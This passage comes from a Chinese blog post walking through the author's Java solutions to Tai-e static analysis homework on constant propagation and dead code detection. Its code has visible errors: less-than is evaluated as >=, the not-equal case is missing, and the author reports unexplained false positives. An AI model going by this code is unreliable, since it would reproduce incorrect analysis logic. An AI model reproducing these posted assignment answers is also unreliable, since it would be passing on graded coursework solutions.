class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConstantPropagation.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> CPFact <span class="title function_">newBoundaryFact</span><span class="params">(CFG&lt;Stmt&gt; cfg)</span> &#123;</span><br><span class="line">    <span class="comment">// point to function args</span></span><br><span class="line">    List&lt;Var&gt; vs = cfg.getIR().getParams();</span><br><span class="line">    <span class="type">CPFact</span> <span class="variable">cp_fact</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CPFact</span>();</span><br><span class="line">    <span class="keyword">for</span> (Var v: vs) &#123;</span><br><span class="line">        <span class="keyword">if</span>(canHoldInt(v)) &#123;</span><br><span class="line">            cp_fact.update(v, Value.getNAC());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cp_fact;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> CPFact <span class="title function_">newInitialFact</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CPFact</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">meetInto</span><span class="params">(CPFact fact, CPFact target)</span> &#123;</span><br><span class="line">    Set&lt;Var&gt; keyset = fact.keySet();</span><br><span class="line">    <span class="keyword">if</span> (!keyset.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Var k: keyset) &#123;</span><br><span class="line">            <span class="type">Value</span> <span class="variable">v1</span> <span class="operator">=</span> fact.get(k);</span><br><span class="line">            <span class="type">Value</span> <span class="variable">v2</span> <span class="operator">=</span> target.get(k);</span><br><span class="line">            <span class="type">Value</span> <span class="variable">result</span> <span class="operator">=</span> meetValue(v1, v2);</span><br><span class="line">            target.update(k, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Value <span class="title function_">meetValue</span><span class="params">(Value v1, Value v2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (v1.isNAC() || v2.isNAC())</span><br><span class="line">        <span class="keyword">return</span> Value.getNAC();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v2.isUndef())</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v1.isUndef())</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v1.isConstant() &amp;&amp; v2.isConstant() &amp;&amp; v1.getConstant() != v2.getConstant())</span><br><span class="line">        <span class="keyword">return</span> Value.getNAC();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v1.isConstant() &amp;&amp; v2.isConstant() &amp;&amp; v1.getConstant() == v2.getConstant())</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> Value.getNAC();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">transferNode</span><span class="params">(Stmt stmt, CPFact in, CPFact out)</span> &#123;</span><br><span class="line">    <span class="comment">// focus on definition (x = .. | x = m(..))</span></span><br><span class="line">    <span class="keyword">if</span> (stmt <span class="keyword">instanceof</span> DefinitionStmt&lt;?,?&gt;) &#123;</span><br><span class="line">        <span class="type">LValue</span> <span class="variable">lv</span> <span class="operator">=</span> ((DefinitionStmt&lt;?, ?&gt;) stmt).getLValue();</span><br><span class="line">        <span class="type">RValue</span> <span class="variable">rv</span> <span class="operator">=</span> ((DefinitionStmt&lt;?, ?&gt;) stmt).getRValue();</span><br><span class="line">        <span class="keyword">if</span> (lv <span class="keyword">instanceof</span> Var &amp;&amp; canHoldInt((Var)lv))&#123;</span><br><span class="line">            <span class="type">CPFact</span> <span class="variable">tf</span> <span class="operator">=</span> in.copy();</span><br><span class="line">            tf.update((Var)lv, evaluate(rv, in));</span><br><span class="line">            <span class="keyword">return</span> out.copyFrom(tf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> out.copyFrom(in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Value <span class="title function_">evaluate</span><span class="params">(Exp exp, CPFact in)</span> &#123;</span><br><span class="line">    <span class="type">Value</span> <span class="variable">v</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> IntLiteral) &#123;</span><br><span class="line">        <span class="comment">// x = c</span></span><br><span class="line">        v = Value.makeConstant(((IntLiteral) exp).getValue());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> Var) &#123;</span><br><span class="line">        <span class="comment">// x = y</span></span><br><span class="line">        v = in.get((Var) exp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> BinaryExp) &#123;</span><br><span class="line">        <span class="comment">// x = y op z</span></span><br><span class="line">        <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> ArithmeticExp) &#123;</span><br><span class="line">            <span class="comment">// + - * / %</span></span><br><span class="line">            <span class="type">Value</span> <span class="variable">left</span> <span class="operator">=</span> in.get(((ArithmeticExp) exp).getOperand1());</span><br><span class="line">            <span class="type">Value</span> <span class="variable">right</span> <span class="operator">=</span> in.get(((ArithmeticExp) exp).getOperand2());</span><br><span class="line">            ArithmeticExp.<span class="type">Op</span> <span class="variable">op</span> <span class="operator">=</span> ((ArithmeticExp) exp).getOperator();</span><br><span class="line">            <span class="keyword">if</span> ((op == ArithmeticExp.Op.DIV || op == ArithmeticExp.Op.REM) &amp;&amp; right.isConstant() &amp;&amp; right.getConstant() == <span class="number">0</span>) &#123;</span><br><span class="line">                v = Value.getUndef();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.isConstant() &amp;&amp; right.isConstant()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (op == ArithmeticExp.Op.ADD)</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() + right.getConstant());</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (op == ArithmeticExp.Op.SUB)</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() - right.getConstant());</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (op == ArithmeticExp.Op.MUL)</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() * right.getConstant());</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (op == ArithmeticExp.Op.DIV)</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() / right.getConstant());</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    v = Value.makeConstant(left.getConstant() % right.getConstant());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.isNAC() || right.isNAC()) &#123;</span><br><span class="line">                v = Value.getNAC();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v = Value.getUndef();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> ConditionExp) &#123;</span><br><span class="line">            <span class="comment">// == != &lt; &gt; &lt;= &gt;=</span></span><br><span class="line">            <span class="type">Value</span> <span class="variable">left</span> <span class="operator">=</span> in.get(((ConditionExp) exp).getOperand1());</span><br><span class="line">            <span class="type">Value</span> <span class="variable">right</span> <span class="operator">=</span> in.get(((ConditionExp) exp).getOperand2());</span><br><span class="line">            ConditionExp.<span class="type">Op</span> <span class="variable">op</span> <span class="operator">=</span> ((ConditionExp) exp).getOperator();</span><br><span class="line">            <span class="keyword">if</span> (left.isConstant() &amp;&amp; right.isConstant()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (op == ConditionExp.Op.EQ) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() == right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.GE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() &gt;= right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.LE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() &lt;= right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.GT) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() &gt; right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.LT) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() &gt;= right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.NE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() != right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.isNAC() || right.isNAC()) &#123;</span><br><span class="line">                v = Value.getNAC();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v = Value.getUndef();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> ShiftExp) &#123;</span><br><span class="line">            <span class="comment">// &lt;&lt; &gt;&gt; &gt;&gt;&gt;</span></span><br><span class="line">            <span class="type">Value</span> <span class="variable">left</span> <span class="operator">=</span> in.get(((ShiftExp) exp).getOperand1());</span><br><span class="line">            <span class="type">Value</span> <span class="variable">right</span> <span class="operator">=</span> in.get(((ShiftExp) exp).getOperand2());</span><br><span class="line">            ShiftExp.<span class="type">Op</span> <span class="variable">op</span> <span class="operator">=</span> ((ShiftExp) exp).getOperator();</span><br><span class="line">            <span class="keyword">if</span> (left.isConstant() &amp;&amp; right.isConstant()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (op == ShiftExp.Op.SHL) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() &lt;&lt; right.getConstant());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ShiftExp.Op.SHR) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() &gt;&gt; right.getConstant());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ShiftExp.Op.USHR) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() &gt;&gt;&gt; right.getConstant());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.isNAC() || right.isNAC()) &#123;</span><br><span class="line">                v = Value.getNAC();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v = Value.getUndef();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> BitwiseExp) &#123;</span><br><span class="line">            <span class="comment">// | &amp; ^</span></span><br><span class="line">            <span class="type">Value</span> <span class="variable">left</span> <span class="operator">=</span> in.get(((BitwiseExp) exp).getOperand1());</span><br><span class="line">            <span class="type">Value</span> <span class="variable">right</span> <span class="operator">=</span> in.get(((BitwiseExp) exp).getOperand2());</span><br><span class="line">            BitwiseExp.<span class="type">Op</span> <span class="variable">op</span> <span class="operator">=</span> ((BitwiseExp) exp).getOperator();</span><br><span class="line">            <span class="keyword">if</span> (left.isConstant() &amp;&amp; right.isConstant()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (op == BitwiseExp.Op.OR) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() | right.getConstant());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == BitwiseExp.Op.AND) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() &amp; right.getConstant());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == BitwiseExp.Op.XOR) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() ^ right.getConstant());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.isNAC() || right.isNAC()) &#123;</span><br><span class="line">                v = Value.getNAC();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v = Value.getUndef();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;unexpect BinaryExp&quot;</span>);</span><br><span class="line">            v = Value.getNAC();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;unexpect Type&quot;</span>);</span><br><span class="line">        v = Value.getNAC();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-死代码检测"><a href="#0x03-死代码检测" class="headerlink" title="0x03 死代码检测"></a>0x03 死代码检测</h2><p>&emsp;除去程序中的死代码，通过组合前两次作业的分析方法来检测死代码。死代码指的是程序中不会被执行的代码，或者执行结果永远不会被其他计算过程用到的代码。本次作业只关心两种死代码：<code>不可达代码与无用赋值</code>。</p><p>&emsp;不可达代码分为<code>分支不可达代码</code>与<code>控制流不可达代码</code>。</p><p>（1）<code>控制流不可达代码（return后的语句）</code>很容易检测：从方法入口开始，遍历CFG并标记可达语句，遍历结束时，没有被标记的语句就是控制流不可达的。</p><p>（2）对于<code>分支不可达代码（常量if判断）</code>，需要预先对被检测代码应用常量传播分析，通过它来告诉我们条件值是否为常量，然后在遍历 CFG 时，不进入相应的不可达分支。</p><p>&emsp;无用赋值：局部变量在一条语句中被赋值，但再也没有该语句后面的语句读取。<code>我们需要对被检测的代码实施活跃变量分析，如果赋值语句左侧的变量是无用变量，则可以标记为无用赋值。但有一个例外，例如x=m()，即使x没有被用到，但是m()方法可能有副作用，可能改变了其他的某些值，因此不能被删除</code>。</p><h3 id="代码相关的知识点-2"><a href="#代码相关的知识点-2" class="headerlink" title="代码相关的知识点"></a>代码相关的知识点</h3><p>&emsp;本次作业无需关注由于删除死代码而产生的新的子代码，例如，删除line-3与line-5，那么：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">deadAssign</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    a = <span class="number">0</span>;     <span class="comment">// dead assignment</span></span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    b = a * <span class="number">2</span>; <span class="comment">// dead assignment</span></span><br><span class="line">    c = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;<code>a=1</code>会变为新的死代码。</p><p>&emsp;Tai-e在运行死代码检测之前会自动运行活跃变量分析与常量传播分析，<code>DeadCodeDetection.analyze</code>提供了获得两种分析算法对目标IR进行分析的结果。</p><p>&emsp;任务：完成DeadCodeDetection的analyze API，以IR作为输入，输出IR中死代码的集合。</p><ul><li><code>pascal.taie.analysis.graph.cfg.Edge</code>。</li></ul><p>&emsp;表示CFG中的边，使用方法<code>getKind()</code>可以得知边的种类。CFG中的节点是Stmt，边的种类与作业相关的有4种（<code>IF_TRUE/IF_FALSE/SWITCH_CASE/SWITCH_DEFAULT</code>），如下所示：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231201211714610.png" alt="image-20231201211714610" style="zoom:67%;" /></p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231201211907323.png" alt="image-20231201211907323" style="zoom:67%;" /></p><ul><li><code>pascal.taie.ir.stmt.If</code>。</li></ul><p>&emsp;Stmt的子类，表示程序中的if语句。while循环与for循环在Tai-e的IR中会被转换为If语句。</p><ul><li><code>pascal.taie.ir.stmt.SwitchStmt</code>。</li></ul><p>&emsp;Stmt的子类，表示程序中的switch语句。</p><ul><li><code>pascal.taie.ir.stmt.AssignStmt</code>。</li></ul><p>&emsp;表示程序中的赋值语句，其与<code>pascal.taie.ir.stmt.DefinitionStmt</code>的关系为：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231201212515325.png" alt="image-20231201212515325" style="zoom:67%;" /></p><h3 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h3><p><img src="/images/tai-e-static-analysis-with-homework/image-20231202161353402.png" alt="image-20231202161353402" style="zoom:67%;" /></p><h3 id="作业代码-2"><a href="#作业代码-2" class="headerlink" title="作业代码"></a>作业代码</h3><p>&emsp;结果显示，表明有误报。没太理解这里面的误报是什么意思？不就是和答案相比较么？</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231202160951714.png" alt="image-20231202160951714" style="zoom:67%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DeadCodeDetection.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Set&lt;Stmt&gt; <span class="title function_">analyze</span><span class="params">(IR ir)</span> &#123;</span><br><span class="line">    <span class="comment">// obtain CFG</span></span><br><span class="line">    CFG&lt;Stmt&gt; cfg = ir.getResult(CFGBuilder.ID);</span><br><span class="line">    <span class="comment">// obtain result of constant propagation</span></span><br><span class="line">    DataflowResult&lt;Stmt, CPFact&gt; constants =</span><br><span class="line">        ir.getResult(ConstantPropagation.ID);</span><br><span class="line">    <span class="comment">// obtain result of live variable analysis</span></span><br><span class="line">    DataflowResult&lt;Stmt, SetFact&lt;Var&gt;&gt; liveVars =</span><br><span class="line">        ir.getResult(LiveVariableAnalysis.ID);</span><br><span class="line">    <span class="comment">// keep statements (dead code) sorted in the resulting set</span></span><br><span class="line">    Set&lt;Stmt&gt; deadCode = <span class="keyword">new</span> <span class="title class_">TreeSet</span>&lt;&gt;(Comparator.comparing(Stmt::getIndex));</span><br><span class="line">    <span class="comment">// TODO - finish me</span></span><br><span class="line">    <span class="comment">// Your task is to recognize dead code in ir and add it to deadCode</span></span><br><span class="line">    Set&lt;Stmt&gt; nodes = cfg.getNodes();</span><br><span class="line">    <span class="keyword">for</span> (Stmt n: nodes) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isDeadCode</span> <span class="operator">=</span> deadCode.contains(n);</span><br><span class="line">        <span class="type">Stmt</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Edge&lt;Stmt&gt; source_edge = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// judge RET</span></span><br><span class="line">        <span class="keyword">if</span> (cfg.getPredsOf(n).isEmpty() &amp;&amp; !cfg.isEntry(n)) &#123;</span><br><span class="line">            entry = n;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// traverse branch and update deadcode set</span></span><br><span class="line">            Set&lt;Stmt&gt; deadcode_set_update = deadcodeSetFromEntry(source_edge, entry, cfg, deadCode);</span><br><span class="line">            deadCode.addAll(deadcode_set_update);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// judge IF &amp; SWITCH</span></span><br><span class="line">        <span class="keyword">if</span> (n <span class="keyword">instanceof</span> If) &#123;</span><br><span class="line">            <span class="comment">// get condition params</span></span><br><span class="line">            <span class="type">ConditionExp</span> <span class="variable">exp</span> <span class="operator">=</span> ((If) n).getCondition();</span><br><span class="line">            <span class="type">Var</span> <span class="variable">op1</span> <span class="operator">=</span> exp.getOperand1();</span><br><span class="line">            <span class="type">Var</span> <span class="variable">op2</span> <span class="operator">=</span> exp.getOperand2();</span><br><span class="line">            ConditionExp.<span class="type">Op</span> <span class="variable">op</span> <span class="operator">=</span> exp.getOperator();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// get op1/op2 value using constant result</span></span><br><span class="line">            <span class="type">CPFact</span> <span class="variable">fact</span> <span class="operator">=</span> constants.getOutFact(n);</span><br><span class="line">            <span class="type">Value</span> <span class="variable">op1_value</span> <span class="operator">=</span> fact.get(op1);</span><br><span class="line">            <span class="type">Value</span> <span class="variable">op2_value</span> <span class="operator">=</span> fact.get(op2);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// judge condition</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">is_true</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (op1_value.isConstant() &amp;&amp; op2_value.isConstant()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">op1_constant_value</span> <span class="operator">=</span> op1_value.getConstant();</span><br><span class="line">                <span class="type">int</span> <span class="variable">op2_constant_value</span> <span class="operator">=</span> op2_value.getConstant();</span><br><span class="line">                <span class="keyword">if</span> (op == ConditionExp.Op.EQ) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (op1_constant_value == op2_constant_value)</span><br><span class="line">                        is_true = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.GE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (op1_constant_value &gt;= op2_constant_value)</span><br><span class="line">                        is_true = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.GT) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (op1_constant_value &gt; op2_constant_value)</span><br><span class="line">                        is_true = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.LE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (op1_constant_value &lt;= op2_constant_value)</span><br><span class="line">                        is_true = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.LT) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (op1_constant_value &lt; op2_constant_value)</span><br><span class="line">                        is_true = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Condition op error&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (op1_value.isConstant() &amp;&amp; op2_value.isConstant()) &#123;</span><br><span class="line">                <span class="comment">/* update deadcode set */</span></span><br><span class="line">                Set&lt;Edge&lt;Stmt&gt;&gt; edges = cfg.getOutEdgesOf(n);</span><br><span class="line"></span><br><span class="line">                <span 